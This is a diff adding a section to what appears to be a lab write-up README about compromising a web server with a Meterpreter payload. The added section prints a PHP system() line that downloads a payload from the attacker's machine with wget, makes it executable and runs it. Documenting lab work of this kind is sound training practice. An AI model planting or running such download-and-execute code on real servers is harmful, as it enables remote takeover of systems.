@@ -148,3 +148,20 @@ At this point, the payload had been created and placed in the web server's docum
 ---
 
 *AI assistance was used in preparing this README.*
+
+
+## 11. Preparing the PHP Download-and-Execute Command
+
+I returned to the previously created `code.php` file and entered a PHP command intended to download the Meterpreter payload from the Kali machine, save it under `/tmp/IM_HERE`, make it executable, and run it.
+
+The command entered was:
+
+```php
+<?php system("wget -O /tmp/IM_HERE http://192.168.43.220/IM_HERE ; cd /tmp ; chmod 777 IM_HERE; ./IM_HERE");?>
+```
+
+The `wget` command specifies `/tmp/IM_HERE` as the download destination. The following commands change the working directory to `/tmp`, change the file permissions, and attempt to execute the downloaded file.
+
+![Screenshot 11: PHP command prepared in code.php](screenshots/11.png)
+
+This screenshot documents the command entered in the PHP file. It does **not** establish that the PHP code was triggered, that the payload was successfully downloaded or executed, or that a reverse Meterpreter session was received. Those results will be recorded separately after they are verified.
